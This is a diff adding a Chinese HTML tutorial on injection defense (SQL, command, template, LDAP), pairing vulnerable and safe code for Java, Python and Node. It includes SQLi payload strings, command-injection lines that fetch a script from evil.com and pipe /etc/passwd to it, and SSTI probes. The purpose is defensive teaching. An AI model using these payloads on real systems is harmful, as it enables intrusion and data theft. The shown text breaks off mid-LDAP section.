@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>二十分钟学透注入攻防</title>
+<style>
+:root{
+  --bg:#F7F7F5; --card:#FFFFFF; --ink:#1A1A18; --muted:#6B6B66; --faint:#9A9A93;
+  --line:#E4E3DE; --accent:#185FA5; --accent-soft:#E6F1FB;
+  --ok:#0F6E56; --ok-soft:#E1F5EE; --warn:#854F0B; --warn-soft:#FAEEDA;
+  --danger:#A32D2D; --danger-soft:#FCEBEB; --violet:#534AB7; --violet-soft:#EEEDFE;
+  --code:#F1EFE8; --radius:12px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{background:var(--bg);color:var(--ink);font-family:system-ui,-apple-system,"Segoe UI","Microsoft YaHei",sans-serif;font-size:15px;line-height:1.7;-webkit-font-smoothing:antialiased}
+code,pre,.mono{font-family:ui-monospace,"Cascadia Code",Consolas,"Courier New",monospace}
+#bar{position:fixed;top:0;left:0;height:3px;width:0;background:var(--accent);z-index:99;transition:width .1s linear}
+header{background:var(--card);border-bottom:1px solid var(--line);padding:44px 24px 34px}
+.wrap{max-width:900px;margin:0 auto;padding:0 24px}
+.serie{display:inline-block;font-size:12px;font-weight:600;letter-spacing:.5px;color:var(--violet);background:var(--violet-soft);padding:3px 11px;border-radius:999px;margin-bottom:14px}
+.density{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.chip{font-size:12px;color:var(--muted);background:var(--bg);border:1px solid var(--line);border-radius:999px;padding:3px 11px}
+.chip b{color:var(--accent);font-weight:600}
+h1{font-size:29px;font-weight:600;letter-spacing:-.4px;line-height:1.3}
+.sub{color:var(--muted);margin-top:10px;font-size:15px}
+.sub b{color:var(--ink);font-weight:500}
+.timerbox{display:flex;align-items:center;gap:18px;flex-wrap:wrap;margin-top:24px;padding:16px 20px;background:var(--bg);border:1px solid var(--line);border-radius:var(--radius)}
+#clock{font-size:34px;font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:1px;color:var(--accent);min-width:118px}
+#clock.done{color:var(--danger)}
+.btn{border:1px solid var(--line);background:var(--card);color:var(--ink);padding:7px 16px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;transition:.15s}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.btn.primary:hover{opacity:.88;color:#fff}
+.timerhint{font-size:13px;color:var(--faint);flex:1;min-width:180px}
+main{padding:36px 0 80px}
+section{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:28px 30px;margin-bottom:20px}
+.shead{display:flex;align-items:center;gap:12px;margin-bottom:6px;flex-wrap:wrap}
+.mins{font-size:12px;font-weight:600;padding:3px 11px;border-radius:999px;background:var(--accent-soft);color:var(--accent);letter-spacing:.3px;white-space:nowrap}
+h2{font-size:20px;font-weight:600;letter-spacing:-.2px}
+h3{font-size:15px;font-weight:600;margin:22px 0 8px}
+h3:first-of-type{margin-top:16px}
+h4{font-size:14px;font-weight:600;margin:16px 0 4px;color:var(--muted)}
+p{color:#3A3A36;margin-top:10px}
+p.lead{color:var(--muted)}
+ul,ol{margin:10px 0 0 20px;color:#3A3A36}
+li{margin:6px 0}
+li::marker{color:var(--faint)}
+strong{font-weight:600;color:var(--ink)}
+.k{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:1px 6px;font-size:13px;color:#7A3E00}
+pre{background:#2C2C2A;color:#E8E6E1;padding:14px 16px;border-radius:10px;overflow-x:auto;font-size:13px;line-height:1.65;margin-top:12px}
+pre .c{color:#8A8A82}
+pre .g{color:#9FE1CB}
+pre .y{color:#FAC775}
+pre .b{color:#85B7EB}
+pre .r{color:#F09595}
+.callout{border-left:3px solid var(--accent);background:var(--accent-soft);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:16px;font-size:14px;color:#0C447C}
+.callout.warn{border-color:var(--warn);background:var(--warn-soft);color:#412402}
+.callout.ok{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.callout.danger{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.callout b{font-weight:600}
+table{width:100%;border-collapse:collapse;margin-top:14px;font-size:14px;table-layout:fixed}
+th{text-align:left;font-weight:600;font-size:13px;color:var(--muted);padding:9px 12px;border-bottom:1px solid var(--line);background:var(--bg)}
+td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;color:#3A3A36}
+tr:last-child td{border-bottom:none}
+td.f{font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:#7A3E00;word-break:break-all}
+.cmds{display:flex;flex-direction:column;gap:8px;margin-top:14px}
+.crow{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg);border:1px solid var(--line);border-radius:9px;flex-wrap:wrap}
+.crow code{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:3px 8px;font-size:13px;color:#7A3E00;white-space:nowrap;overflow-x:auto;max-width:100%}
+.crow .desc{font-size:13.5px;color:var(--muted);flex:1;min-width:150px}
+.copy{border:1px solid var(--line);background:var(--card);border-radius:6px;padding:3px 10px;font-size:12px;cursor:pointer;color:var(--muted);font-family:inherit}
+.copy:hover{border-color:var(--accent);color:var(--accent)}
+.copy.ok{border-color:var(--ok);color:var(--ok)}
+.steps{counter-reset:s;margin-top:14px}
+.step{display:flex;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.step:last-child{border-bottom:none}
+.step::before{counter-increment:s;content:counter(s);flex:0 0 26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.step .txt{flex:1;font-size:14.5px;color:#3A3A36}
+.step .txt b{color:var(--ink)}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin-top:14px}
+.card{background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card .ct{font-size:14px;font-weight:600;margin-bottom:5px;display:flex;align-items:center;gap:7px}
+.card .cd{font-size:13.5px;color:var(--muted);line-height:1.6}
+.dot{width:8px;height:8px;border-radius:50%;flex:0 0 8px}
+.quiz{margin-top:14px}
+.q{border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin-bottom:10px}
+.q .qt{font-size:14.5px;font-weight:600;margin-bottom:8px}
+.opt{display:block;width:100%;text-align:left;padding:8px 12px;margin:5px 0;border:1px solid var(--line);background:var(--card);border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;color:#3A3A36;transition:.15s}
+.opt:hover{border-color:var(--accent)}
+.opt.right{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.opt.wrong{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.ans{font-size:13.5px;color:var(--muted);margin-top:8px;display:none}
+.ans.show{display:block}
+.pit{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line)}
+.pit:last-child{border-bottom:none}
+.pit .num{flex:0 0 28px;height:28px;border-radius:8px;background:var(--danger-soft);color:var(--danger);font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.pit .pb{flex:1}
+.pit .pt{font-size:14.5px;font-weight:600}
+.pit .pd{font-size:13.5px;color:var(--muted);margin-top:3px}
+footer{text-align:center;color:var(--faint);font-size:13px;padding:0 24px 50px}
+@media(max-width:600px){
+  h1{font-size:23px} section{padding:22px 18px} header{padding:32px 0 26px}
+  .wrap{padding:0 16px} table{font-size:13px;table-layout:auto}
+  th,td{padding:8px 8px}
+}
+</style>
+</head>
+<body>
+<div id="bar"></div>
+
+<header>
+  <div class="wrap">
+    <span class="serie">十分钟系列 · 第 23 期 · 高密度版</span>
+    <h1>二十分钟学透注入攻防</h1>
+    <p class="sub">SQL / 命令 / 模板 / LDAP 注入，本质是同一个错误：<b>不可信的数据被当成了代码执行</b>。这篇不讲花哨的绕过技巧，讲清楚注入为什么成立、参数化为什么能防、以及每类汇聚点的安全写法（Java / Python / Node 三端对比）。</p>
+    <div class="density">
+      <span class="chip">覆盖 <b>8</b> 大模块</span>
+      <span class="chip"><b>5</b> 类注入</span>
+      <span class="chip">三端修复示例 <b>Java/Python/Node</b></span>
+      <span class="chip"><b>10</b> 个坑</span>
+      <span class="chip"><b>6</b> 道自测</span>
+    </div>
+    <div class="timerbox">
+      <div id="clock">20:00</div>
+      <button class="btn primary" id="start">开始计时</button>
+      <button class="btn" id="reset">重置</button>
+      <span class="timerhint" id="hint">建议边读边对着自己项目里的 SQL 拼接和命令执行代码逐条检查</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+<section id="s0">
+  <div class="shead"><span class="mins">开始前</span><h2>所有注入的统一模型</h2></div>
+  <p class="lead">SQL 注入、命令注入、模板注入、LDAP 注入看着五花八门，底层是同一个失误。记住这个三段模型，后面每个模块都只是在换"汇聚点"。</p>
+  <div class="cards">
+    <div class="card"><div class="ct"><span class="dot" style="background:var(--accent)"></span>入口</div><div class="cd">一切不可信数据：表单、URL 参数、Header、Cookie、JSON body、上传的文件名，<b>甚至数据库里已存的数据</b>（二阶注入）</div></div>
+    <div class="card"><div class="ct"><span class="dot" style="background:var(--danger)"></span>汇聚点</div><div class="cd">数据被拼进"代码"的地方：SQL 语句、shell 命令、模板源码、LDAP 过滤器、XPath 表达式</div></div>
+    <div class="card"><div class="ct"><span class="dot" style="background:var(--ok)"></span>防线</div><div class="cd">在汇聚点之前把数据无害化：参数化绑定、白名单、转义。<b>防线必须卡在汇聚点，不能只卡在入口</b></div></div>
+  </div>
+  <h4>一个 30 秒就能复现的最小实验（Python + SQLite 内存库）</h4>
+  <pre><span class="c"># 在自己电脑上跑一遍，比读十页原理都直观</span>
+<span class="b">import</span> sqlite3
+conn = sqlite3.connect(<span class="y">':memory:'</span>)
+conn.execute(<span class="y">"CREATE TABLE users(id INTEGER, name TEXT)"</span>)
+conn.execute(<span class="y">"INSERT INTO users VALUES(1,'admin')"</span>)
+conn.execute(<span class="y">"INSERT INTO users VALUES(2,'zhangsan')"</span>)
+
+<span class="c"># 危险写法：字符串拼接</span>
+name = <span class="y">"x' OR '1'='1"</span>
+sql = <span class="y">"SELECT * FROM users WHERE name = '"</span> + name + <span class="y">"'"</span>
+print(sql)                      <span class="c"># SELECT * FROM users WHERE name = 'x' OR '1'='1'</span>
+print(conn.execute(sql).fetchall())  <span class="c"># 注入了：把整张表都查了出来</span>
+
+<span class="c"># 安全写法：参数绑定</span>
+print(conn.execute(<span class="y">"SELECT * FROM users WHERE name = ?"</span>, (name,)).fetchall())
+<span class="c"># 返回空列表 —— 同样的输入，被当成一个"值"而不是"代码"</span></pre>
+  <div class="callout warn">
+    <b>关于攻击 payload 的边界：</b>本文列出的 payload 全部只用于<b>防御教学</b>——理解"输入为什么能改变语义"，才知道防线该卡在哪一层。任何未授权系统上的测试都是违法的，渗透测试必须在获得书面授权、隔离环境内进行。每个 payload 出现的地方，都紧跟修复方案。
+  </div>
+</section>
+
+<section id="s1">
+  <div class="shead"><span class="mins">模块 1</span><h2>SQL 注入原理与五大变体</h2></div>
+  <p class="lead">SQL 注入的根因只有一句话：<b>开发者把用户输入拼进了 SQL 字符串，而 SQL 解析器分不清哪部分是"结构"、哪部分是"数据"。</b>攻击者用引号提前闭合字符串，就能把自己的内容写进 SQL 的语法结构里。</p>
+  <pre><span class="c">// 后端拼出的 SQL（危险写法）</span>
+SELECT * FROM users WHERE name = <span class="y">'张三'</span> AND pw = <span class="y">'...'</span>
+
+<span class="c">// 攻击者在用户名字段输入：x' OR '1'='1</span>
+SELECT * FROM users WHERE name = <span class="r">'x' OR '1'='1'</span> AND pw = <span class="y">'...'</span>
+<span class="c">// OR '1'='1' 永真，登录判断被绕过 —— 这就是最古老的注入形态</span></pre>
+  <h4>五大变体，按"能不能直接看到数据"排列</h4>
+  <table>
+    <tr><th style="width:110px">变体</th><th style="width:250px">原理</th><th style="width:220px">怎么判断存在</th><th>教学 payload</th></tr>
+    <tr><td><b>报错注入</b></td><td>构造让数据库报错的语句，把查询结果带进错误信息里回显</td><td>页面直接打印 SQL 异常（生产没关错误回显）</td><td class="f">' AND updatexml(1,concat(0x7e,version()),1)-- </td></tr>
+    <tr><td><b>布尔盲注</b></td><td>页面真假表现不同（内容有无、长度差异），逐字符猜解数据</td><td>条件真假时页面响应可区分</td><td class="f">' AND SUBSTRING(db_name(),1,1)='a'-- </td></tr>
+    <tr><td><b>时间盲注</b></td><td>用延迟函数把真假转成响应时间差，逐个比特猜</td><td>响应时间出现 5 秒级差异</td><td class="f">' AND IF(1=1,SLEEP(5),0)-- </td></tr>
+    <tr><td><b>堆叠查询</b></td><td>用 ; 结束当前语句再执行第二条（UPDATE/DELETE 等写操作）</td><td>驱动允许多语句执行</td><td class="f">x'; UPDATE users SET pw='x' WHERE name='admin'-- </td></tr>
+    <tr><td><b>二阶注入</b></td><td>恶意数据先"合法"存入数据库，之后被另一段代码取出拼进新 SQL 时才触发</td><td>需要两段业务配合，常规扫描器扫不出来</td><td class="f">注册用户名 admin'#，后续查询拼接时语义被改写</td></tr>
+  </table>
+  <div class="callout danger">
+    <b>为什么时间盲注最防不胜防：</b>页面回显被关掉、真假响应又被打磨成一致时，攻击者还有最后一招 —— 让数据库"睡"5 秒。<span class="k">SLEEP(5)</span>、<span class="k">BENCHMARK()</span>、<span class="k">pg_sleep()</span> 都是这类信号源。<b>数据库响应时间的异常抖动，本身就是一条该告警的安全信号。</b><br>
+    <b>注释符细节：</b>MySQL 里 <span class="k">--</span> 后面必须跟空格或控制字符才生效，<span class="k">#</span> 也可以作注释；不同数据库注释符不同，这也是拼接党翻车的重灾区。
+  </div>
+  <div class="callout">
+    <b>防御预告：</b>以上所有变体，在参数化查询面前全部失效 —— 因为引号、分号、注释符作为"数据"传进去时，根本进不了语法解析阶段。下一模块讲清楚这为什么成立。
+  </div>
+</section>
+
+<section id="s2">
+  <div class="shead"><span class="mins">模块 2</span><h2>参数化查询与预编译的本质</h2></div>
+  <p class="lead">"用 PreparedStatement 防注入"人人都背过，但多数人说不出<b>为什么</b>。说不出为什么，就会在该用 <span class="k">${}</span> 的地方手滑。</p>
+  <h4>预编译防注入的三个步骤</h4>
+  <div class="steps">
+    <div class="step"><div class="txt"><b>第一步：带 ? 的 SQL 模板先发给数据库。</b>数据库解析这条 SQL 的语法结构（哪些是关键字、哪些是表名列名），生成执行计划。此时 ? 只是占位符，还没有值。</div></div>
+    <div class="step"><div class="txt"><b>第二步：参数以"值"的形式单独绑定。</b>驱动把参数按协议发给数据库，数据库把它塞进执行计划的数据槽位 —— 只当数据，不再解析。</div></div>
+    <div class="step"><div class="txt"><b>第三步：执行。</b>所以参数里哪怕是 <span class="k">' OR '1'='1</span>，对数据库来说也只是一个"长得像 SQL 的普通字符串"，没有任何语法地位。</div></div>
+  </div>
+  <table>
+    <tr><th style="width:150px">对比项</th><th style="width:250px">字符串拼接</th><th>预编译占位</th></tr>
+    <tr><td><b>解析时机</b></td><td>每次执行都要重新解析整条 SQL</td><td>SQL 结构只解析一次，参数不参与解析</td></tr>
+    <tr><td><b>参数地位</b></td><td>参数是 SQL 源码的组成部分</td><td>参数是值，与语法结构物理隔离</td></tr>
+    <tr><td><b>注入可能性</b></td><td>引号可闭合字符串，分号可结束语句，语义可被改写</td><td>无语法结构可改写，注入面为零</td></tr>
+    <tr><td><b>附带收益</b></td><td>无</td><td>执行计划可复用，高并发场景还有性能收益</td></tr>
+  </table>
+  <h4>三端对照：危险 vs 安全</h4>
+  <pre><span class="c">// ===== Java / JDBC =====</span>
+<span class="c">// 危险</span>
+String sql = <span class="r">"SELECT * FROM users WHERE name = '" + name + "'"</span>;
+conn.createStatement().executeQuery(sql);
+
+<span class="c">// 安全</span>
+<span class="g">PreparedStatement</span> ps = conn.prepareStatement(<span class="y">"SELECT * FROM users WHERE name = ?"</span>);
+ps.setString(1, name);          <span class="c">// 参数只进数据槽位</span>
+ps.executeQuery();
+
+<span class="c">// ===== Python / sqlite3、pymysql、psycopg2 通用 =====</span>
+<span class="c">// 危险</span>
+cur.execute(<span class="r">"SELECT * FROM users WHERE name = '%s'" % name</span>)     <span class="c">// % 格式化 = 拼接</span>
+cur.execute(<span class="r">f"SELECT * FROM users WHERE name = '{name}'"</span>)       <span class="c">// f-string = 拼接</span>
+
+<span class="c">// 安全：第二个参数是参数序列，驱动层绑定</span>
+<span class="g">cur.execute</span>(<span class="y">"SELECT * FROM users WHERE name = %s"</span>, (name,))
+
+<span class="c">// ===== Node / mysql2 =====</span>
+<span class="c">// 危险：query() 会对字符串做拼接，别被"它也有第二个参数"骗了</span>
+conn.query(<span class="r">"SELECT * FROM users WHERE name = '" + name + "'"</span>)
+
+<span class="c">// 安全：execute() 走预编译协议</span>
+<span class="g">conn.execute</span>(<span class="y">"SELECT * FROM users WHERE name = ?"</span>, [name])</pre>
+  <h4>哪些位置<b>不能</b>参数化（重点，翻车高发区）</h4>
+  <table>
+    <tr><th style="width:200px">位置</th><th style="width:130px">能否参数化</th><th>安全做法</th></tr>
+    <tr><td>WHERE 的等值 / 范围条件</td><td><b>可以</b></td><td>正常 <span class="k">?</span> / <span class="k">%s</span> 绑定</td></tr>
+    <tr><td>LIKE 的通配值</td><td><b>可以</b></td><td>把 % 拼在参数值里或 SQL 侧固定，<b>别拼用户输入</b>：<span class="k">WHERE name LIKE CONCAT('%', ?, '%')</span></td></tr>
+    <tr><td>IN 列表</td><td><b>可以</b></td><td>按元素个数生成对应数量的 ?，如 <span class="k">WHERE id IN (?,?,?)</span>；MyBatis 用 foreach 生成 #{} 列表</td></tr>
+    <tr><td>LIMIT / OFFSET</td><td><b>多数可以</b></td><td>MySQL PreparedStatement 支持 LIMIT 位置绑定参数；不能绑定时转 int 再拼</td></tr>
+    <tr><td>表名 / 列名</td><td><b>不可以</b></td><td><b>白名单枚举映射</b>：用户传 <span class="k">sort=time</span>，代码映射为 <span class="k">created_at</span>，只认白名单里的键</td></tr>
+    <tr><td>ORDER BY 方向</td><td><b>不可以</b></td><td>只接受 ASC / DESC 两个常量，其余抛异常</td></tr>
+  </table>
+  <div class="callout ok">
+    <b>白名单是唯一正确解法：</b>动态表名、排序列这类"标识符"位置，标准做法是维护一张 <span class="k">Map&lt;String,String&gt;</span>（用户可选值 → 真实列名），用户传的 key 不在 Map 里就直接拒绝。<b>永远不要"校验一下字符"就拼进去</b>——黑名单防不住编码变形、注释截断、大小写混淆。
+  </div>
+</section>
+<section id="s3">
+  <div class="shead"><span class="mins">模块 3</span><h2>MyBatis：${} vs #{}，一道经典送命题</h2></div>
+  <p class="lead">这是国内 Java 面试出现频率最高的安全题之一。一句话答案：<b>#{} 是预编译占位符，${} 是字符串拼接。</b>但面试官真正想听的是"你知道 ${} 在什么情况下还可以安全使用"。</p>
+  <table>
+    <tr><th style="width:110px">占位符</th><th style="width:240px">机制</th><th>安全性</th></tr>
+    <tr><td class="f">#{name}</td><td>生成 <span class="k">?</span> 占位符，通过 JDBC 预编译绑定，等价于 PreparedStatement.setString</td><td><b>安全。</b>参数只进数据槽位，注入面为零</td></tr>
+    <tr><td class="f">${name}</td><td>在<b>构建 SQL 字符串阶段</b>就把值直接拼进 SQL，不做任何转义</td><td><b>危险。</b>用户可控的 ${} 等于直接拼接，注入必中</td></tr>
+  </table>
+  <pre><span class="c">&lt;!-- 危险：表名来自用户输入 --&gt;</span>
+<span class="r">&lt;select id="query"&gt;</span>
+  SELECT * FROM ${tableName} WHERE name = #{name}
+<span class="r">&lt;/select&gt;</span>
+<span class="c">// 如果 tableName 可控：user; DROP TABLE audit_log -- 之类的语义改写</span>
+
+<span class="c">&lt;!-- 安全：ORDER BY 字段用 choose 白名单枚举 --&gt;</span>
+<span class="g">&lt;select id="list"&gt;</span>
+  SELECT * FROM article
+  <span class="b">&lt;choose&gt;</span>
+    <span class="b">&lt;when</span> test=<span class="y">"sort == 'time'"</span><span class="b">&gt;</span>ORDER BY created_at DESC<span class="b">&lt;/when&gt;</span>
+    <span class="b">&lt;when</span> test=<span class="y">"sort == 'hot'"</span><span class="b">&gt;</span>ORDER BY views DESC<span class="b">&lt;/when&gt;</span>
+    <span class="b">&lt;otherwise&gt;</span>ORDER BY id DESC<span class="b">&lt;/otherwise&gt;</span>
+  <span class="b">&lt;/choose&gt;</span>
+<span class="g">&lt;/select&gt;</span>
+<span class="c">// 用户传什么都不能跳出这三个分支 —— 这就是白名单</span></pre>
+  <h4>两个高频真实场景的正确写法</h4>
+  <pre><span class="c">&lt;!-- 场景一：LIKE 模糊查询。错误做法是把 % 拼在 ${} 里 --&gt;</span>
+<span class="r">&lt;!-- 错误：WHERE name LIKE '%${kw}%' --&gt;</span>
+<span class="c">&lt;!-- 正确一：用 CONCAT，% 在 SQL 侧，值走 #{} --&gt;</span>
+<span class="g">WHERE name LIKE CONCAT('%', #{kw}, '%')</span>
+<span class="c">&lt;!-- 正确二：用 &lt;bind&gt; 先在 Java 侧拼好值，再走 #{} --&gt;</span>
+<span class="b">&lt;bind</span> name=<span class="y">"pattern"</span> value=<span class="y">"'%' + kw + '%'"</span><span class="b">/&gt;</span>
+WHERE name LIKE #{pattern}
+
+<span class="c">&lt;!-- 场景二：IN (?,?,?) 列表。错误做法是 ${ids} 直接拼 --&gt;</span>
+<span class="r">&lt;!-- 错误：WHERE id IN (${ids}) --&gt;</span>
+<span class="c">&lt;!-- 正确：foreach 为每个元素生成一个 #{} --&gt;</span>
+<span class="g">&lt;foreach</span> collection=<span class="y">"ids"</span> item=<span class="y">"id"</span> open=<span class="y">"("</span> separator=<span class="y">","</span> close=<span class="y">")"</span><span class="g">&gt;</span>#{id}<span class="g">&lt;/foreach&gt;</span></pre>
+  <div class="callout danger">
+    <b>MyBatis 的例外位置只有一处：</b>动态表名、动态列名这类"标识符"。而且必须过<b>白名单</b>（Map 映射或 choose 枚举），${} 的原值绝不能直接来自请求参数。<br>
+    <b>排查命令：</b>全局搜索 XML 里的 <span class="k">${</span>，逐个确认值的来源。Mapper 接口上的 <span class="k">@Param</span> 注解不提供任何转义，别指望它。<b>同样的规则适用于所有"字符串替换型"模板引擎</b>——JPA 的 <span class="k">createNativeQuery</span> 拼接、SQLAlchemy 的 <span class="k">text()</span> 里 f-string、Prisma 的 <span class="k">$queryRawUnsafe</span>，都在这个危险名单里（模块 7 汇总）。
+  </div>
+</section>
+
+<section id="s4">
+  <div class="shead"><span class="mins">模块 4</span><h2>命令注入与进程调用安全</h2></div>
+  <p class="lead">命令注入的原理和 SQL 注入完全同构：不可信数据被拼进 <b>shell 命令字符串</b>，shell 的元字符（<span class="k">; | &amp; ` $() 换行</span>）让攻击者提前结束原命令、追加自己的命令。</p>
+  <pre><span class="c"># 业务本意：让用户填一个 IP，执行 ping</span>
+<span class="c"># 用户输入：127.0.0.1; cat /etc/passwd</span>
+<span class="r">ping -c 1 127.0.0.1; cat /etc/passwd</span>   <span class="c"># ; 后面的命令照常执行</span>
+<span class="c"># 用户输入：$(curl evil.com/x.sh | sh)   —— 命令替换同样成立</span>
+<span class="c"># 用户输入：127.0.0.1 | curl -d @/etc/passwd evil.com —— 数据外带</span></pre>
+  <h4>三端危险写法 vs 安全写法</h4>
+  <pre><span class="c">// ===== Python =====</span>
+<span class="c">// 危险：shell=True 时字符串整体交给 shell 解析，元字符全部生效</span>
+<span class="r">subprocess.call</span>(<span class="y">f"ping -c 1 {ip}"</span>, shell=True)
+<span class="r">os.system</span>(<span class="y">f"ping -c 1 {ip}"</span>)              <span class="c">// os.system 永远过 shell，没有安全形态</span>
+
+<span class="c">// 安全：列表形式 + shell=False，参数不经 shell 解析</span>
+<span class="g">subprocess.run</span>([<span class="y">"ping"</span>, <span class="y">"-c"</span>, <span class="y">"1"</span>, ip], check=True)
+<span class="c">// 确实需要管道 / 重定向时，用 shlex.quote 转义每个片段，或改用管道 API</span>
+<span class="g">shlex.quote</span>(ip)   <span class="c">// 把不可信值包成安全字面量：'127.0.0.1; rm -rf /'</span>
+
+<span class="c">// ===== Java =====</span>
+<span class="c">// 危险：单字符串形式会经过 shell 解析（等价于 sh -c）</span>
+<span class="r">Runtime.getRuntime().exec</span>(<span class="y">"ping -c 1 "</span> + ip);
+<span class="c">// 危险：显式包一层 sh -c，转义全部前功尽弃</span>
+<span class="r">Runtime.getRuntime().exec</span>(<span class="y">new String[]{"sh","-c","ping -c 1 "</span> + ip});
+
+<span class="c">// 安全：数组形式，每个参数独立传递，不经 shell 解析</span>
+<span class="g">new ProcessBuilder</span>(<span class="y">"ping"</span>, <span class="y">"-c"</span>, <span class="y">"1"</span>, ip).start();
+<span class="c">// 注意：exec(String[]) 不会解析元字符，这是防命令注入的关键形态</span>
+
+<span class="c">// ===== Node =====</span>
+<span class="c">// 危险：默认 spawn 一个 shell 来执行</span>
+<span class="r">exec</span>(<span class="y">`ping -c 1 ${ip}</span><span class="y">`</span>)
+<span class="c">// 安全：execFile / spawn 的 args 数组，不经过 shell</span>
+<span class="g">execFile</span>(<span class="y">"ping"</span>, [<span class="y">"-c"</span>, <span class="y">"1"</span>, ip], cb)</pre>
+  <div class="callout warn">
+    <b>两个容易漏的角落：</b><br>
+    ① <b>数组形式不等于万能。</b>某些命令本身就能执行代码：<span class="k">find . -exec</span>、<span class="k">awk 'BEGIN{system(...)}'</span>、<span class="k">git clone --upload-pack</span>。参数数组只保证"参数不被 shell 解析"，不保证被调程序不把参数当代码。<br>
+    ② <b>能不要 shell 就不要 shell。</b>如果业务只是取文件大小、读日志，用语言内置 API（Python pathlib / Java Files.size / Node fs.stat）完成，比 exec 一个命令又安全又可测。
+  </div>
+  <div class="callout ok">
+    <b>最小权限兜底：</b>进程以低权限用户运行（容器里 <span class="k">USER app</span>、不用 privileged）、文件系统只读挂载、出网白名单。<b>命令注入防不住的那一天，这些决定损失上限。</b>
+  </div>
+</section>
+
+<section id="s5">
+  <div class="shead"><span class="mins">模块 5</span><h2>模板注入（SSTI）</h2></div>
+  <p class="lead">模板引擎（Jinja2、FreeMarker、Velocity、Thymeleaf、Handlebars）的设计初衷是"把数据填进模板"。一旦<b>用户输入被当成模板源码</b>而不是模板数据，注入就升级成了代码执行 —— 因为模板语法本身就是一门编程语言。</p>
+  <h4>检测到利用的经典链条（Jinja2，仅示意原理）</h4>
+  <pre><span class="c"># 第一步：探测是否把输入当模板渲染 —— 数学运算是否被求值</span>
+输入 {{7*7}}  →  页面出现 <span class="r">49</span>   <span class="c"># 中招了：输入被求值而不是原样显示</span>
+输入 ${7*7}   →  页面出现 <span class="r">49</span>   <span class="c"># 同上，说明后端可能是 FreeMarker 类引擎</span>
+
+<span class="c"># 第二步（教学原理，不展开完整链）：模板上下文里的对象可以被遍历</span>
+{{ config }}                    <span class="c"># Flask 应用可能泄露 SECRET_KEY 等配置</span>
+{{ ''.__class__.__mro__ }}      <span class="c"># Python 对象链：字符串 → 类 → 父类 → ...</span>
+<span class="c"># 沿对象链最终可到达子类查找与内建函数，实现任意代码执行</span>
+<span class="c"># 防御视角只需记住：用户输入一旦进模板源码，RCE 只是时间问题</span></pre>
+  <h4>危险写法 vs 安全写法（Python / Flask）</h4>
+  <pre><span class="c">// 危险：render_template_string 把用户输入当模板源码渲染</span>
+<span class="r">@app.route("/hello")</span>
+<span class="r">def hello():</span>
+    name = request.args.get("name")
+    <span class="r">return render_template_string("Hello " + name)</span>   <span class="c">// name = {{7*7}} 即被求值</span>
+
+<span class="c">// 安全：输入作为模板变量传递，模板文件是开发者写死的</span>
+<span class="g">@app.route("/hello")</span>
+<span class="g">def hello():</span>
+    name = request.args.get("name")
+    <span class="g">return render_template("hello.html", name=name)</span>   <span class="c">// hello.html: Hello {{ name }}</span>
+<span class="c">// name 里的 {{ }} 会被原样输出，因为它是"数据"不是"模板"</span></pre>
+  <table>
+    <tr><th style="width:200px">形态</th><th style="width:150px">是否安全</th><th>说明</th></tr>
+    <tr><td class="f">render_template("page.html", x=user_input)</td><td><b>安全</b></td><td>模板源码来自开发者，输入只是变量值</td></tr>
+    <tr><td class="f">render_template_string(user_input)</td><td><b>危险</b></td><td>输入即模板源码，SSTI 直接成立</td></tr>
+    <tr><td class="f">render_template_string("... " + user_input)</td><td><b>危险</b></td><td>拼接即注入，与 SQL 拼接同构</td></tr>
+    <tr><td class="f">模板文件在数据库/文件系统里、可被用户改</td><td><b>危险</b></td><td>"可编辑的模板"是产品功能也是攻击面，必须做权限与审计</td></tr>
+    <tr><td class="f">邮件/短信模板用用户填的字段渲染</td><td><b>取决于来源</b></td><td>模板体必须来自代码/配置，用户数据只做变量注入</td></tr>
+  </table>
+  <div class="callout">
+    <b>Java 侧的同类问题：</b>FreeMarker 的 <span class="k">Template(String)</span> 直接渲染用户字符串、Velocity 的 <span class="k">evaluate()</span>、历史上 Struts2 的 OGNL 表达式注入（大量 CVE 的根源）都是同一模式。<b>判据只有一个：被渲染的"模板源码"是否包含用户可控内容。</b>
+  </div>
+</section>
+
+<section id="s6">
+  <div class="shead"><span class="mins">模块 6</span><h2>LDAP 与 XPath 注入</h2></div>
+  <p class="lead">LDAP 和 XPath 用的也是"字符串拼查询表达式"模式，所以注入形态与 SQL 完全平行 —— 只是语法从 SQL 换成了过滤器表达式。面试和代码审计里出现频率低，但一旦中招，后果是认证绕过或目录数据全量泄露。</p>
+  <h4>LDAP 注入：闭合过滤器的括号</h4>
+  <pre><span class="c"># 正常过滤器：在 ou=users 下找 uid=用户输入 的条目</span>
+(&amp;(uid=<span class="y">张三</span>)(password=<span class="y">xxx</span>))
+
+<span class="c"># 攻击输入：*)(uid=*))(|(uid=*</span>
+(&amp;(uid=<span class="r">*)(uid=*))(|(uid=*</span>)(password=xxx))
